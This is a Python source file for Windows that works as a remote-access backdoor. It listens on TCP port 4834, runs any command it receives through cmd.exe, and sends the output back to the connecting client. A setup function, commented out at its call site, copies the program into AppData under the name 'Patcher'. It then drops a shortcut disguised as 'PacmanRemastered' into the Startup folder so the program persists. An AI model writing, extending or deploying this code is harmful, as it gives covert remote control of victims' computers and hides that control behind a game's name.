import os
import sys
import socket
import time
import subprocess
import shutil
import win32com.client
# uncomment firstSetup()

running = True # running server
finished = False # finished running commands this session
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4834
try:
    sock.bind(("0.0.0.0", port))
except:
    exit(0)
sock.listen(5)
print("Socket Created and Listening . . . ")

def firstSetup():
    shell = win32com.client.Dispatch("WScript.Shell")
    targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher"
    startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    try:
        if (not os.path.isdir(targetPath)):
            os.mkdir(targetPath)
        if (not os.path.isdir(targetPath + "/dist")):
            head, tail = os.path.split(sys.argv[0])
            shutil.copytree(head, (targetPath + "/dist"))
            shortcut = shell.CreateShortCut(targetPath + "/dist/PacmanRemastered.lnk")
            shortcut.Targetpath = targetPath + "/dist/PacmanRemastered.exe"
            shortcut.save()
            shutil.copy(targetPath + "/dist/PacmanRemastered.lnk", startupPath)
    except OSError as error:
        print(error)
        pass
    
def clientConnect():
    print("Waiting for Connection . . . ")
    client, address = sock.accept()
    print("Connection Created with " + str(address))
    try:
        commandHandler(client)
        client.send("\nConnection Closed".encode())
        time.sleep(1)
        client.close()
    except:
        print("Connection Interrupted")
        pass
    print("Connection Closed")
    time.sleep(1)
    if running == True:
        clientConnect()

def commandHandler(client):
    global finished
    try:
        client.send(("\nCurrent Directory: " + os.getcwd()).encode())
        time.sleep(1)
        client.send("Command".encode())
        command = client.recv(1024).decode().strip()
        if (command == "Finish"):
            finished = True
        if (not finished):
            runCommand(command, client)
            if (running):
                commandHandler(client)
    except:
        print("Connection Interrupted")
        pass

def runCommand(command: str, client):
    global running
    global finished
    if ("cd " in command):
        command = command.removeprefix("cd ")
        os.chdir(command)
    else:
        if (command == "Disconnect"):
            print("Internet Released")
            subprocess.Popen("cmd.exe /c ipconfig /release >nul 2>&1")
            time.sleep(5)
            subprocess.Popen("cmd.exe /c ipconfig /release >nul 2>&1")
            time.sleep(5)
            subprocess.Popen("cmd.exe /c ipconfig /renew >nul 2>&1")
            print("Internet Renewed")
        elif (command == "Terminate"):
            print("Terminating")
            running = False
            finished = True
        else:
            prefixCommand = "cmd.exe /c "
            # suffixCommand = " >nul 2>&1"
            command = prefixCommand + command.strip() # + suffixCommand
            print("Running " + command)
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            client.send("Output: ".encode())
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                client.send(line.strip())
            client.send("Errors: ".encode() )
            while True:
                line = process.stderr.readline()
                if not line:
                    break
                client.send(line.strip())

# firstSetup()
clientConnect()